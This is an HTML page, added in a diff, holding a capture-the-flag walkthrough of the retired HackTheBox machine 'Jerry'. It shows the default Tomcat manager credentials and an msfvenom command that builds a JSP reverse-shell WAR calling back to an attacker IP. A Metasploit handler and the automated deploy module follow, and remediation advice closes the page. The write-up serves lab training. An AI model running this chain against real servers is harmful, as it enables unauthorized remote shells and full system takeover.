@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Jerry: Tomcat manager deploy straight to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="Default Tomcat manager creds, one malicious WAR upload, and the service account is already SYSTEM — the shortest path on this list. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-07 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Jerry: Tomcat manager deploy straight to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Jerry is a retired HackTheBox easy Windows machine and the shortest write-up in this series. Synopsis: default Tomcat manager creds, one malicious WAR upload, and the service account is already SYSTEM.</p>
+<h2><span class="amber">$</span> Enumeration — one port, one console</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: spot Tomcat plus defaults</span>
+nmap -sC -sV 10.10.10.95   # 8080 Apache Tomcat/7.0.88
+# manager login: tomcat:s3cret</pre>
+<p>A single interesting port: 8080 serving Apache Tomcat 7. The manager login falls to the default pair tomcat:s3cret. Management consoles with vendor defaults are a foothold.</p>
+<h2><span class="amber">$</span> Exploitation — malicious WAR deploy</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: build WAR, deploy, catch SYSTEM</span>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f war &gt; shell.war
+# manager GUI -&gt; Deploy -&gt; upload shell.war -&gt; browse /shell/
+msfconsole -q -x &quot;use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.10.14.23; run&quot;
+# --- or fully automated: use exploit/multi/http/tomcat_mgr_deploy</pre>
+<p>Deploy the WAR through the upload form, trigger it, catch the session. The manual route shows the mechanism; the Metasploit module automates the whole chain. Match jsp_shell to the Tomcat/JSP stack.</p>
+<h2><span class="amber">$</span> Flags — no privesc needed</h2>
+<p>The Tomcat service runs as SYSTEM, so the deployed shell lands at the highest privilege and both flags fall in one session. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Manager-script API calls before the HTML manager (the web form deploy is simpler) and generating a WAR for the wrong Java payload type.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Change every default console credential, restrict manager access by IP, run services as least-privilege accounts, and patch or retire Tomcat 7. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
